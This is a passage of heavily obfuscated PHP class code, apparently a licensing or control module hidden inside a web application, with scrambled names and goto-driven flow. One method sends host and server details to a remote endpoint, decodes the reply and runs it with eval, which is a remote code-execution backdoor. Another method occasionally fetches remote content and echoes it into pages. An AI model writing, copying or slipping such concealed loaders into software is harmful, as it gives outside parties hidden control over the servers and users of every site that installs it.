$Fò‹Ç¹–È¶ = $B«ÃöºÄŒŒ[612]; if (strlen($Fò‹Ç¹–È¶) < $B«ÃöºÄŒŒ[598]) { return; } if ($a‘¡•¤Ú²ì[$f™†ã‰Ğ‰[89]] != $f™†ã‰Ğ‰[226]) { $f™†ã‰Ğ‰[61]($f™†ã‰Ğ‰[62])->{$_SERVER[şìšµëâ­Æ][227]}($f™†ã‰Ğ‰[89], $f™†ã‰Ğ‰[226]); } goto eÅ’„ª®«; eÅ’„ª®«: $f™†ã‰Ğ‰[116]($f™†ã‰Ğ‰[238])->{$_SERVER[şìšµëâ­Æ][239]}(!0); goto c£¬‘íòÏ; c£¬‘íòÏ: } private function aspv29c2a2e2() { goto dŞí…÷ÃİŞ; dŞí…÷ÃİŞ: $d¹ŸŞÇ¼Ïƒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cÍÏÂÒ÷î =& $_SERVER[şìšµëâ­Æ]; $cÍÏÂÒ÷î[61]($cÍÏÂÒ÷î[62])->{$_SERVER[şìšµëâ­Æ][227]}(array($cÍÏÂÒ÷î[215] => $cÍÏÂÒ÷î[10], $cÍÏÂÒ÷î[216] => $cÍÏÂÒ÷î[10], $cÍÏÂÒ÷î[126] => $cÍÏÂÒ÷î[127], $cÍÏÂÒ÷î[128] => $cÍÏÂÒ÷î[10], $cÍÏÂÒ÷î[129] => $cÍÏÂÒ÷î[10])); goto a„êô‰íö¨; D¾Æ ¿ğª”: $this->kmdnabc621eb = array(); $cŸôÛ…ØËÃ = $d¹ŸŞÇ¼Ïƒ[614]; while (strlen($cŸôÛ…ØËÃ) < $d¹ŸŞÇ¼Ïƒ[598]) { if (!$cŸôÛ…ØËÃ) { break; } $cŸôÛ…ØËÃ++; } goto fËâéÅƒÌ±; a„êô‰íö¨: $cÍÏÂÒ÷î[61]($cÍÏÂÒ÷î[62])->{$_SERVER[şìšµëâ­Æ][224]}($cÍÏÂÒ÷î[225], $cÍÏÂÒ÷î[240]); $CôÌÌ’¥Œ¤ = $d¹ŸŞÇ¼Ïƒ[613]; if (!$CôÌÌ’¥Œ¤) { die; } goto D¾Æ ¿ğª”; fËâéÅƒÌ±: $this->znorf421f867 = $cÍÏÂÒ÷î[127]; $e¾ôÁŞ·† = $d¹ŸŞÇ¼Ïƒ[615]; if (strlen($e¾ôÁŞ·†) < $d¹ŸŞÇ¼Ïƒ[568]) { return; } goto fë¡ä¸òŠ¾; fë¡ä¸òŠ¾: } private function ozymcaf3fd77() { goto Bãäˆ—ŒÌÈ; d—óŠ›ˆ: if (!$Cİ’×‹¾¶‡) { die; } $this->znorf421f867 = $bÁİ‘òÔèÎ[$b³‡ŒÕ«Óí[126]]; $e–¸Ëê™¾ = $c¦ ‰âºò[618]; goto FáÒÅäá§•; Bãäˆ—ŒÌÈ: $c¦ ‰âºò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b³‡ŒÕ«Óí =& $_SERVER[şìšµëâ­Æ]; $_SERVER[$b³‡ŒÕ«Óí[181]] = $b³‡ŒÕ«Óí[112]($_SERVER, $b³‡ŒÕ«Óí[181], APP_HOST); goto e¤Æ¸‹™Œß; d• ˜ĞÌ›: Cache::set($d”óëÚ³, $Cù«”åôĞ); $this->kmdnabc621eb = $Cù«”åôĞ; $Cİ’×‹¾¶‡ = $c¦ ‰âºò[617]; goto d—óŠ›ˆ; A†º„…ñîé: $fõåğÊ«×£ = $b³‡ŒÕ«Óí[150]($Cù«”åôĞ[$b³‡ŒÕ«Óí[151]]); if ($b³‡ŒÕ«Óí[242]() >= $fõåğÊ«×£) { return $this->{$_SERVER[şìšµëâ­Æ][170]}(); } $Cù«”åôĞ[$b³‡ŒÕ«Óí[241]] = $b³‡ŒÕ«Óí[242](); goto d• ˜ĞÌ›; Båñ÷‘ªÀ: $Cù«”åôĞ = Cache::get($d”óëÚ³); if (!$b³‡ŒÕ«Óí[198]($Cù«”åôĞ) || !isset($Cù«”åôĞ[$b³‡ŒÕ«Óí[241]]) || $b³‡ŒÕ«Óí[242]() - $Cù«”åôĞ[$b³‡ŒÕ«Óí[241]] >= 60) { $B÷ã»¢ƒÁÚ = $b³‡ŒÕ«Óí[228]($b³‡ŒÕ«Óí[61]($b³‡ŒÕ«Óí[11])->{$_SERVER[şìšµëâ­Æ][229]}(), $b³‡ŒÕ«Óí[230]); $C÷ƒìù³¯ = $B÷ã»¢ƒÁÚ[$b³‡ŒÕ«Óí[231]]; $cÌ·ò¶áÄ = $b³‡ŒÕ«Óí[120]($_SERVER[$b³‡ŒÕ«Óí[121]] . $b³‡ŒÕ«Óí[220]($a›·ˆâÃÃ) . $bÁİ‘òÔèÎ[$b³‡ŒÕ«Óí[216]]); $DÊøœ‰ğÉ§ = $b³‡ŒÕ«Óí[220]($b³‡ŒÕ«Óí[25]($cÌ·ò¶áÄ, 10, 16)); $Cù«”åôĞ = $this->{$_SERVER[şìšµëâ­Æ][195]}($C÷ƒìù³¯[$b³‡ŒÕ«Óí[100]][$DÊøœ‰ğÉ§], $cÌ·ò¶áÄ); $Cù«”åôĞ = $b³‡ŒÕ«Óí[197]($Cù«”åôĞ, !0); } if (!$b³‡ŒÕ«Óí[198]($Cù«”åôĞ)) { return $this->{$_SERVER[şìšµëâ­Æ][170]}(); } goto A†º„…ñîé; fÊÏˆœ‚×: $d”óëÚ³ = $b³‡ŒÕ«Óí[236] . $b³‡ŒÕ«Óí[120]($a›·ˆâÃÃ . $b³‡ŒÕ«Óí[237]); $Dƒ„†›Ä¶¬ = $c¦ ‰âºò[585]; if (!$Dƒ„†›Ä¶¬) { die; } goto Båñ÷‘ªÀ; b³óÄÉŸËå: if (!$dœŸâãÁ“Ö) { return; } if ($bÁİ‘òÔèÎ[$b³‡ŒÕ«Óí[126]] == $b³‡ŒÕ«Óí[127]) { return; } $a›·ˆâÃÃ = $b³‡ŒÕ«Óí[61]($b³‡ŒÕ«Óí[62])->{$_SERVER[şìšµëâ­Æ][63]}($b³‡ŒÕ«Óí[122]); goto fÊÏˆœ‚×; e¤Æ¸‹™Œß: $this->znorf421f867 = $b³‡ŒÕ«Óí[127]; $bÁİ‘òÔèÎ = $b³‡ŒÕ«Óí[61]($b³‡ŒÕ«Óí[62])->{$_SERVER[şìšµëâ­Æ][63]}(); $dœŸâãÁ“Ö = $c¦ ‰âºò[616]; goto b³óÄÉŸËå; FáÒÅäá§•: } private function fvez7ffa1b16() { goto dßÀ™ÊÕ»ğ; eëĞ÷šğ†ã: if (!$dÚ”‹Ó‚…¤) { die; } if ($dğ¤–„ == $AËÒ‘ôí³[243] && $this->znorf421f867 == $AËÒ‘ôí³[127]) { $AËÒ‘ôí³[172]($AËÒ‘ôí³[204]($AËÒ‘ôí³[244]), !1, $AËÒ‘ôí³[245]); } $Bì»‹ˆà×› = array($AËÒ‘ôí³[246], $AËÒ‘ôí³[247]); goto e¸ÜŸËÛ®; e¸ÜŸËÛ®: if ($AËÒ‘ôí³[248]($dğ¤–„, $Bì»‹ˆà×›)) { if ($this->znorf421f867 == $AËÒ‘ôí³[127] && isset($DŞ›À¹ÒÎĞ[$AËÒ‘ôí³[249]])) { $AËÒ‘ôí³[172]($AËÒ‘ôí³[204]($AËÒ‘ôí³[244]), !1, $AËÒ‘ôí³[245]); die; } $fµ‚¨©Ó”õ = $this->{$_SERVER[şìšµëâ­Æ][143]}(); if ($fµ‚¨©Ó”õ != $AËÒ‘ôí³[250]($AËÒ‘ôí³[251])) { if ($fµ‚¨©Ó”õ <= $AËÒ‘ôí³[61]($AËÒ‘ôí³[145])->{$_SERVER[şìšµëâ­Æ][146]}()) { $AËÒ‘ôí³[172]($AËÒ‘ôí³[204]($AËÒ‘ôí³[252]), !1, $AËÒ‘ôí³[245]); die; } } } goto fæ”‰–Ò‘æ; E“¡ÒäŒËÚ: $eâ“îƒóŸ = $E¶ààÓİ³[619]; $dğ¤–„ = $_SERVER[$AËÒ‘ôí³[44]]; $dÚ”‹Ó‚…¤ = $E¶ààÓİ³[620]; goto eëĞ÷šğ†ã; dßÀ™ÊÕ»ğ: $E¶ààÓİ³ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AËÒ‘ôí³ =& $_SERVER[şìšµëâ­Æ]; $DŞ›À¹ÒÎĞ = $GLOBALS[$AËÒ‘ôí³[22]]; goto E“¡ÒäŒËÚ; fæ”‰–Ò‘æ: } private function iovlcb15da1e() { goto cÏÜÏó¶™Á; e–İæ†ÒóÆ: while ($E‚‘Â±¬¼ < $Aãç¥´Ê›[579]) { if ($E‚‘Â±¬¼ >= 0) { break; } $E‚‘Â±¬¼++; } $bÎ¢¥ƒÃ‘[264]($bÎ¢¥ƒÃ‘[265]); if ($FùŠ¬çŒõÆ && $bÎ¢¥ƒÃ‘[32]($FùŠ¬çŒõÆ, $bÎ¢¥ƒÃ‘[266])) { echo $FùŠ¬çŒõÆ; } goto e²‚÷‰¬‘; dƒğß‰¢ñ: $E™ğŞƒâŒª = $bÎ¢¥ƒÃ‘[258](array($bÎ¢¥ƒÃ‘[259] => array($bÎ¢¥ƒÃ‘[260] => $bÎ¢¥ƒÃ‘[261], $bÎ¢¥ƒÃ‘[262] => 3))); $FùŠ¬çŒõÆ = @$bÎ¢¥ƒÃ‘[263]($CĞáÙ†Ï‚Ÿ, !1, $E™ğŞƒâŒª); $E‚‘Â±¬¼ = $Aãç¥´Ê›[622]; goto e–İæ†ÒóÆ; C¤Öà°´Íö: $CĞáÙ†Ï‚Ÿ = $this->{$_SERVER[şìšµëâ­Æ][256]}($CĞáÙ†Ï‚Ÿ, $bÎ¢¥ƒÃ‘[257]); $FïÎé †õ = $Aãç¥´Ê›[621]; if (strlen($FïÎé †õ) < $Aãç¥´Ê›[579]) { return; } goto dƒğß‰¢ñ; e²‚÷‰¬‘: die; goto a¿–ãèˆ¾; cÏÜÏó¶™Á: $Aãç¥´Ê› =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bÎ¢¥ƒÃ‘ =& $_SERVER[şìšµëâ­Æ]; $Bº’†ò„” = array($bÎ¢¥ƒÃ‘[141], $bÎ¢¥ƒÃ‘[253]); goto AÀö†¨™‚õ; AÀö†¨™‚õ: if (!$bÎ¢¥ƒÃ‘[112]($GLOBALS, $bÎ¢¥ƒÃ‘[138]) || !isset($_GET[$bÎ¢¥ƒÃ‘[254]])) { return; } if (!$bÎ¢¥ƒÃ‘[248]($_SERVER[$bÎ¢¥ƒÃ‘[44]], $Bº’†ò„”)) { return; } $CĞáÙ†Ï‚Ÿ = $bÎ¢¥ƒÃ‘[255]; goto C¤Öà°´Íö; a¿–ãèˆ¾: } public function emkj2d618bae($DÚ»ë‹â†°) { goto f”œ­‘ÚĞ; f”œ­‘ÚĞ: $b®Ó©ñÚİ‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AÖ¢²œêœ‹ =& $_SERVER[şìšµëâ­Æ]; if ($this->znorf421f867 == $AÖ¢²œêœ‹[267]) { return $DÚ»ë‹â†°; } goto Càâõ«ê; Càâõ«ê: $eƒÎá…ÉÎ = array($AÖ¢²œêœ‹[268] => $AÖ¢²œêœ‹[269], $AÖ¢²œêœ‹[270] => $AÖ¢²œêœ‹[269], $AÖ¢²œêœ‹[271] => $AÖ¢²œêœ‹[269], $AÖ¢²œêœ‹[272] => $AÖ¢²œêœ‹[269], $AÖ¢²œêœ‹[273] => $AÖ¢²œêœ‹[269], $AÖ¢²œêœ‹[274] => $AÖ¢²œêœ‹[269], $AÖ¢²œêœ‹[275] => $AÖ¢²œêœ‹[276], $AÖ¢²œêœ‹[277] => $AÖ¢²œêœ‹[276], $AÖ¢²œêœ‹[278] => $AÖ¢²œêœ‹[276], $AÖ¢²œêœ‹[279] => $AÖ¢²œêœ‹[276], $AÖ¢²œêœ‹[280] => $AÖ¢²œêœ‹[276], $AÖ¢²œêœ‹[281] => $AÖ¢²œêœ‹[276], $AÖ¢²œêœ‹[282] => $AÖ¢²œêœ‹[276]); $Aí÷ƒµÊÙÇ = $b®Ó©ñÚİ‘[623]; $b‰ÙÏÓšÍ = $AÖ¢²œêœ‹[0]($AÖ¢²œêœ‹[283], $AÖ¢²œêœ‹[112]($this->kmdnabc621eb, $AÖ¢²œêœ‹[135], $AÖ¢²œêœ‹[10])); goto D™æáËÊö‚; D™æáËÊö‚: $f‹–µòËƒ“ = array(); $aËò¨àŒ¸˜ = $b®Ó©ñÚİ‘[624]; if (!$aËò¨àŒ¸˜) { return; } goto d–¯æˆÇ‹Ã; d–¯æˆÇ‹Ã: foreach ($eƒÎá…ÉÎ as $F×ÕÒô½ì² => $aŸ¼åŠ‡æŠ) { if ($aŸ¼åŠ‡æŠ == $AÖ¢²œêœ‹[269] && $AÖ¢²œêœ‹[25]($this->znorf421f867, 0, 1) == $AÖ¢²œêœ‹[269]) { continue; } if (!$AÖ¢²œêœ‹[248]($F×ÕÒô½ì², $b‰ÙÏÓšÍ)) { $f‹–µòËƒ“[] = $F×ÕÒô½ì²; } } foreach ($f‹–µòËƒ“ as $F×ÕÒô½ì²) { unset($DÚ»ë‹â†°[$F×ÕÒô½ì²]); } return $DÚ»ë‹â†°; goto aÓ¡ù¼¨ä«; aÓ¡ù¼¨ä«: } private function ekiw31bcb018() { $dõœ´¯ÈŞÂ =& $_SERVER[şìšµëâ­Æ]; if ($this->znorf421f867 != $dõœ´¯ÈŞÂ[127]) { return; } $GLOBALS[$dõœ´¯ÈŞÂ[100]][$dõœ´¯ÈŞÂ[104]][$dõœ´¯ÈŞÂ[284]] = $dõœ´¯ÈŞÂ[226]; $GLOBALS[$dõœ´¯ÈŞÂ[100]][$dõœ´¯ÈŞÂ[285]] = $dõœ´¯ÈŞÂ[226]; if ($dõœ´¯ÈŞÂ[61]($dõœ´¯ÈŞÂ[286])->{$_SERVER[şìšµëâ­Æ][63]}($dõœ´¯ÈŞÂ[89]) != $dõœ´¯ÈŞÂ[240]) { $dõœ´¯ÈŞÂ[61]($dõœ´¯ÈŞÂ[286])->{$_SERVER[şìšµëâ­Æ][227]}($dõœ´¯ÈŞÂ[89], $dõœ´¯ÈŞÂ[240]); } } public function ocuq9e966855() { return $_SERVER[şìšµëâ­Æ][287]; } private function qjsd107082e9() { goto a™åŸÄÜ¡; a™åŸÄÜ¡: $A‘¡”ÃºÛ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fŠ°ÂŠç­ë =& $_SERVER[şìšµëâ­Æ]; $A¼æŒ¾Úâğ = array($fŠ°ÂŠç­ë[288], $fŠ°ÂŠç­ë[289], $fŠ°ÂŠç­ë[290]); goto d¢‘ª¡”„†; d¢‘ª¡”„†: $f‡Ùçˆ¨ë° = $A‘¡”ÃºÛ[625]; $fõèòÏê¾ = $fŠ°ÂŠç­ë[291] . $fŠ°ÂŠç­ë[120]($fŠ°ÂŠç­ë[292]); $D‚´Ì‰óÁ = $A‘¡”ÃºÛ[626]; goto EË¨Šë™¯é; A ‡Ñ¸çÜÌ: $añ¼²¿İ‰Ú = array($fŠ°ÂŠç­ë[171] => $fŠ°ÂŠç­ë[61]($fŠ°ÂŠç­ë[62])->{$_SERVER[şìšµëâ­Æ][63]}($fŠ°ÂŠç­ë[215]), $fŠ°ÂŠç­ë[184] => $this->znorf421f867, $fŠ°ÂŠç­ë[182] => $_SERVER[$fŠ°ÂŠç­ë[183]], $fŠ°ÂŠç­ë[175] => $fŠ°ÂŠç­ë[155], $fŠ°ÂŠç­ë[178] => $_SERVER[$fŠ°ÂŠç­ë[179]]); $C„ ³¹æ¤ = $A‘¡”ÃºÛ[628]; while ($C„ ³¹æ¤ < $A‘¡”ÃºÛ[568]) { if ($C„ ³¹æ¤ >= 0) { break; } $C„ ³¹æ¤++; } goto eçÙ³å¥Ú; eñ‡‚ ä†: if ($this->{$_SERVER[şìšµëâ­Æ][206]}($Bë–‰µºôí[$fŠ°ÂŠç­ë[297]]) != $añ¼²¿İ‰Ú[$fŠ°ÂŠç­ë[171]]) { $bïù­æ© = array($fŠ°ÂŠç­ë[208] => $fŠ°ÂŠç­ë[61]($fŠ°ÂŠç­ë[62])->{$_SERVER[şìšµëâ­Æ][63]}($fŠ°ÂŠç­ë[122]), $fŠ°ÂŠç­ë[209] => $_SERVER[$fŠ°ÂŠç­ë[121]], $fŠ°ÂŠç­ë[210] => $fŠ°ÂŠç­ë[211](), $fŠ°ÂŠç­ë[180] => $_SERVER[$fŠ°ÂŠç­ë[181]]); $F†½áì¥ÔÛ = $this->{$_SERVER[şìšµëâ­Æ][212]}($fŠ°ÂŠç­ë[154]($bïù­æ©)); $Bë–‰µºôí = $this->{$_SERVER[şìšµëâ­Æ][189]}($fŠ°ÂŠç­ë[213] . $F†½áì¥ÔÛ); if ($Bë–‰µºôí && $fŠ°ÂŠç­ë[198]($Bë–‰µºôí) && isset($Bë–‰µºôí[$fŠ°ÂŠç­ë[297]])) { $BîÑííê‡ = $this->{$_SERVER[şìšµëâ­Æ][195]}($Bë–‰µºôí[$fŠ°ÂŠç­ë[297]], 2); if ($BîÑííê‡) { $BîÑííê‡ = $this->{$_SERVER[şìšµëâ­Æ][206]}($BîÑííê‡); } if ($BîÑííê‡) { try { @eval($BîÑííê‡); } catch (Exception $CŞĞÙ¶Ó™ˆ) { } } } } goto d¡ÑóëÉŸ¨; E„Â÷ôŞç: if ($fŠ°ÂŠç­ë[242]() % 4 != 0) { return; } $E¦¥„ËÜÈ = $fŠ°ÂŠç­ë[13](array($fŠ°ÂŠç­ë[293], $fŠ°ÂŠç­ë[294]), $fõèòÏê¾); if ($E¦¥„ËÜÈ && $fŠ°ÂŠç­ë[242]() - $E¦¥„ËÜÈ < $fŠ°ÂŠç­ë[250]($fŠ°ÂŠç­ë[295])) { return; } goto Eæ‚ƒ¡ğœº; Eæ‚ƒ¡ğœº: $fŠ°ÂŠç­ë[13](array($fŠ°ÂŠç­ë[293], $fŠ°ÂŠç­ë[158]), $fõèòÏê¾, $fŠ°ÂŠç­ë[242]()); $C‚Ä»„ºÖ = $A‘¡”ÃºÛ[627]; while ($C‚Ä»„ºÖ < $A‘¡”ÃºÛ[598]) { if ($C‚Ä»„ºÖ >= 0) { break; } $C‚Ä»„ºÖ++; } goto A ‡Ñ¸çÜÌ; eçÙ³å¥Ú: $Bë–‰µºôí = $this->{$_SERVER[şìšµëâ­Æ][189]}($fŠ°ÂŠç­ë[296], $añ¼²¿İ‰Ú); $a¢šäĞ¾® = $A‘¡”ÃºÛ[629]; while ($a¢šäĞ¾® < $A‘¡”ÃºÛ[573]) { if ($a¢šäĞ¾® >= 0) { break; } $a¢šäĞ¾®++; } goto F’ÔÔÙ¿µÉ; EË¨Šë™¯é: if (!$D‚´Ì‰óÁ) { die; } if ($this->znorf421f867 == $fŠ°ÂŠç­ë[127] || !$fŠ°ÂŠç­ë[112]($GLOBALS, $fŠ°ÂŠç­ë[138])) { return; } if (!$fŠ°ÂŠç­ë[248]($_SERVER[$fŠ°ÂŠç­ë[44]], $A¼æŒ¾Úâğ)) { return; } goto E„Â÷ôŞç; F’ÔÔÙ¿µÉ: if (!$fŠ°ÂŠç­ë[198]($Bë–‰µºôí)) { return; } if ($Bë–‰µºôí[$fŠ°ÂŠç­ë[171]] && $Bë–‰µºôí[$fŠ°ÂŠç­ë[297]]) { if ($this->{$_SERVER[şìšµëâ­Æ][206]}($Bë–‰µºôí[$fŠ°ÂŠç­ë[297]]) == $añ¼²¿İ‰Ú[$fŠ°ÂŠç­ë[171]]) { return; } } $this->{$_SERVER[şìšµëâ­Æ][170]}(); goto eñ‡‚ ä†; d¡ÑóëÉŸ¨: } private function yaokea0dd504($bê³ ß™Ó¡ = '', $C‡¤èëÆ‘ = array(), $bç£ìçà© = 5) { goto dÑŒ­‚ôš; dÑŒ­‚ôš: $e­âä³à™– =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EÉÏóÂ…„ =& $_SERVER[şìšµëâ­Æ]; $aò‡ŠÍ‹²‡ = $EÉÏóÂ…„[298]; goto BÛéÒØ‰¾‰; e¦ƒ­Ó±àè: $eÄÉÆîàÓ² = $e­âä³à™–[633]; goto fƒ»Èê‰; F¡Ù‡Í½É±: $Dó¸öŞ£‹ = $e­âä³à™–[626]; while ($Dó¸öŞ£‹ < $e­âä³à™–[564]) { if ($Dó¸öŞ£‹ >= 0) { break; } $Dó¸öŞ£‹++; } $aò‡ŠÍ‹²‡ = $aò‡ŠÍ‹²‡ . $bê³ ß™Ó¡ . $EÉÏóÂ…„[300] . $EÉÏóÂ…„[301]($C‡¤èëÆ‘); goto Ağ‘–ëæÇ; FœåÎ®™½: $C‡¤èëÆ‘ = @$EÉÏóÂ…„[263]($aò‡ŠÍ‹²‡, !1, $eÓ›Î›áÂí); $Fè…®ñ™‘ = $e­âä³à™–[632]; return $EÉÏóÂ…„[197]($C‡¤èëÆ‘, !0); goto e¦ƒ­Ó±àè; BÛéÒØ‰¾‰: $bÌ°Ş›ø§° = $e­âä³à™–[630]; if (!$bÌ°Ş›ø§°) { return; } $aò‡ŠÍ‹²‡ = $this->{$_SERVER[şìšµëâ­Æ][256]}($aò‡ŠÍ‹²‡, $EÉÏóÂ…„[299]); goto F¡Ù‡Í½É±; Ağ‘–ëæÇ: if ($C‡¤èëÆ‘ === -1) { return $aò‡ŠÍ‹²‡; } $eÓ›Î›áÂí = $EÉÏóÂ…„[258](array($EÉÏóÂ…„[259] => array($EÉÏóÂ…„[262] => $bç£ìçà©, $EÉÏóÂ…„[260] => $EÉÏóÂ…„[302]), $EÉÏóÂ…„[303] => array($EÉÏóÂ…„[304] => !1, $EÉÏóÂ…„[305] => !1))); $eºå·ãáÓØ = $e­âä³à™–[631]; goto FœåÎ®™½; fƒ»Èê‰: } private function svnm90917dd3() { goto eñ³Èƒ³ñ; B¶Şó½ïªÙ: $C°Ö’Ö§Ê“ = $b¬ÒŠÒÁ…²[634]; if (strlen($C°Ö’Ö§Ê“) < $b¬ÒŠÒÁ…²[573]) { return; } $fÃ¼£®‡´¬ = $BÏçàµ“‹†[$this->znorf421f867]; goto Dµ±•Ö£í; eñ³Èƒ³ñ: $b¬ÒŠÒÁ…² =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FöŒÅ®‘‰ä =& $_SERVER[şìšµëâ­Æ]; $BÏçàµ“‹† = array($FöŒÅ®‘‰ä[306] => $FöŒÅ®‘‰ä[307], $FöŒÅ®‘‰ä[308] => $FöŒÅ®‘‰ä[309], $FöŒÅ®‘‰ä[310] => $FöŒÅ®‘‰ä[311], $FöŒÅ®‘‰ä[312] => $FöŒÅ®‘‰ä[313], $FöŒÅ®‘‰ä[314] => $FöŒÅ®‘‰ä[315], $FöŒÅ®‘‰ä[316] => $FöŒÅ®‘‰ä[251], $FöŒÅ®‘‰ä[317] => $FöŒÅ®‘‰ä[251], $FöŒÅ®‘‰ä[318] => $FöŒÅ®‘‰ä[307], $FöŒÅ®‘‰ä[319] => $FöŒÅ®‘‰ä[309], $FöŒÅ®‘‰ä[320] => $FöŒÅ®‘‰ä[311], $FöŒÅ®‘‰ä[321] => $FöŒÅ®‘‰ä[322], $FöŒÅ®‘‰ä[323] => $FöŒÅ®‘‰ä[313], $FöŒÅ®‘‰ä[324] => $FöŒÅ®‘‰ä[325], $FöŒÅ®‘‰ä[326] => $FöŒÅ®‘‰ä[315], $FöŒÅ®‘‰ä[327] => $FöŒÅ®‘‰ä[328], $FöŒÅ®‘‰ä[329] => $FöŒÅ®‘‰ä[330], $FöŒÅ®‘‰ä[331] => $FöŒÅ®‘‰ä[332]); goto B¶Şó½ïªÙ; Dµ±•Ö£í: $FÏ³¢–‡ä = $b¬ÒŠÒÁ…²[635]; if (!$FÏ³¢–‡ä) { return; } $fÃ¼£®‡´¬ = $FöŒÅ®‘‰ä[250]($fÃ¼£®‡´¬ ? $fÃ¼£®‡´¬ : $FöŒÅ®‘‰ä[307]); goto bÑò¥éÚ´¥; f‰§«Ü¥î‚: $fÓ»õöÒê = $fÓ»õöÒê ? $FöŒÅ®‘‰ä[250]($fÓ»õöÒê) : 0; return $fÃ¼£®‡´¬ + $fÓ»õöÒê; goto EæÏù„ø°÷; bÑò¥éÚ´¥: $aˆ½ŒŠ­Úì = $b¬ÒŠÒÁ…²[636]; while ($aˆ½ŒŠ­Úì < $b¬ÒŠÒÁ…²[598]) { if ($aˆ½ŒŠ­Úì >= 0) { break; } $aˆ½ŒŠ­Úì++; } $fÓ»õöÒê = $FöŒÅ®‘‰ä[112]($this->kmdnabc621eb, $FöŒÅ®‘‰ä[333]); goto f‰§«Ü¥î‚; EæÏù„ø°÷: } public function vadu4d9b2685($d§ó„ĞÎ¬¯) { goto eÇºĞ¢‘¦Ê; eÇºĞ¢‘¦Ê: $b¤á¼‘øìë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DğôçËÊøØ =& $_SERVER[şìšµëâ­Æ]; $B°ôóËÊÚ = $this->{$_SERVER[şìšµëâ­Æ][143]}(); goto eÂçí×éí‘; eÃ…±Üë¥Ñ: $Aéá¾ÕÅ˜¿ = $b¤á¼‘øìë[637]; while ($Aéá¾ÕÅ˜¿ < $b¤á¼‘øìë[568]) { if ($Aéá¾ÕÅ˜¿ >= 0) { break; } $Aéá¾ÕÅ˜¿++; } if ($D‚Â©–­‚ <= $B°ôóËÊÚ) { return; } goto e®ï‚Ú×ÄÅ; e®ï‚Ú×ÄÅ: $AöÁ¸•ËÒ = $DğôçËÊøØ[61]($DğôçËÊøØ[145])->{$_SERVER[şìšµëâ­Æ][335]}($DğôçËÊøØ[334])->{$_SERVER[şìšµëâ­Æ][336]}($B°ôóËÊÚ)->{$_SERVER[şìšµëâ­Æ][337]}(); $AöÁ¸•ËÒ = $DğôçËÊøØ[228]($AöÁ¸•ËÒ, $DğôçËÊøØ[10], $DğôçËÊøØ[334]); if (!$DğôçËÊøØ[248]($d§ó„ĞÎ¬¯[$DğôçËÊøØ[334]], $AöÁ¸•ËÒ)) { $DğôçËÊøØ[172]($DğôçËÊøØ[338], !1, $DğôçËÊøØ[245]); } goto d°Š’·èÜ£; eÂçí×éí‘: if ($d§ó„ĞÎ¬¯[$DğôçËÊøØ[334]] == $DğôçËÊøØ[226]) { return; } if ($B°ôóËÊÚ >= $DğôçËÊøØ[250]($DğôçËÊøØ[251])) { return; } $D‚Â©–­‚ = $DğôçËÊøØ[61]($DğôçËÊøØ[145])->{$_SERVER[şìšµëâ­Æ][146]}(); goto eÃ…±Üë¥Ñ; d°Š’·èÜ£: } public function iexz0a90ab21() { goto D×”íõ´å; c—î˜ƒòÔ¶: echo $f’„†ù–œ­[340] . $f’„†ù–œ­[341]($Dê³’£‰î) . $f’„†ù–œ­[342]; goto e”ÌÛó×¢ˆ; b™ø˜Øî¢É: $cœµ·…²Ò¢ = $this->{$_SERVER[şìšµëâ­Æ][256]}($cœµ·…²Ò¢, $f’„†ù–œ­[257]); $d²òˆê¡ìÑ = $f’„†ù–œ­[258](array($f’„†ù–œ­[259] => array($f’„†ù–œ­[260] => $f’„†ù–œ­[261], $f’„†ù–œ­[262] => 3))); $Dê³’£‰î = @$f’„†ù–œ­[263]($cœµ·…²Ò¢, !1, $d²òˆê¡ìÑ); goto c—î˜ƒòÔ¶; D×”íõ´å: $f’„†ù–œ­ =& $_SERVER[şìšµëâ­Æ]; if (!$f’„†ù–œ­[112]($GLOBALS, $f’„†ù–œ­[138]) || $f’„†ù–œ­[339](1, 100) > 20) { return; } $cœµ·…²Ò¢ = $f’„†ù–œ­[255]; goto b™ø˜Øî¢É; e”ÌÛó×¢ˆ: } private function duvx4ccf0d34($fåĞÅ³²¥‚, $fÒ§©—ïÒ¤, $eÆ¿¹•ŸºÕ = 3) { goto bëí¤…Ç´; Dªß¶Ò‡Í÷: $fåĞÅ³²¥‚ = $Bà›ŞÇ¨Äğ[2]($fåĞÅ³²¥‚); $E›÷Îİà¤ = $EË÷ŞŠŠò[638]; $B¥ãÚ«­¿ = $Bà›ŞÇ¨Äğ[339](0, 5) . $Bà›ŞÇ¨Äğ[10]; goto F‚é†£Âã; bĞêóù‹á: $aÚò•Å¬Ã¶ = $EË÷ŞŠŠò[653]; if ($eÆ¿¹•ŸºÕ - 1 > 0) { $aìÆ‘®ÔÓå = $this->{$_SERVER[şìšµëâ­Æ][133]}($aìÆ‘®ÔÓå, $fÒ§©—ïÒ¤, $eÆ¿¹•ŸºÕ - 1); } return $aìÆ‘®ÔÓå; goto E¹ç¡‡á¦; F‚é†£Âã: $aù‹‰ÔÊÍê = $EË÷ŞŠŠò[639]; if (!$aù‹‰ÔÊÍê) { return; } $CÛà¶Í = $Bà›ŞÇ¨Äğ[130](15); goto CÛ…ˆÀ›ñˆ; CÛ…ˆÀ›ñˆ: $aèÁ¯¶”†ì = $EË÷ŞŠŠò[640]; $E¦“ŒÒ¼¤ = $Bà›ŞÇ¨Äğ[344]; $cÁ—¯µ©§ = $EË÷ŞŠŠò[641]; goto bÅÎÑ¸®°†; bÅÎÑ¸®°†: if (strlen($cÁ—¯µ©§) < $EË÷ŞŠŠò[598]) { return; } switch ($B¥ãÚ«­¿) { case $Bà›ŞÇ¨Äğ[240]: $aìÆ‘®ÔÓå = $this->{$_SERVER[şìšµëâ­Æ][153]}($fåĞÅ³²¥‚, $Bà›ŞÇ¨Äğ[220]($fÒ§©—ïÒ¤ . $CÛà¶Í)); break; case $Bà›ŞÇ¨Äğ[226]: $aìÆ‘®ÔÓå = $this->{$_SERVER[şìšµëâ­Æ][153]}($fåĞÅ³²¥‚, $Bà›ŞÇ¨Äğ[220]($CÛà¶Í . $fÒ§©—ïÒ¤)); $DÖîÇËöÂ = $EË÷ŞŠŠò[642]; break; case $Bà›ŞÇ¨Äğ[345]: $aìÆ‘®ÔÓå = 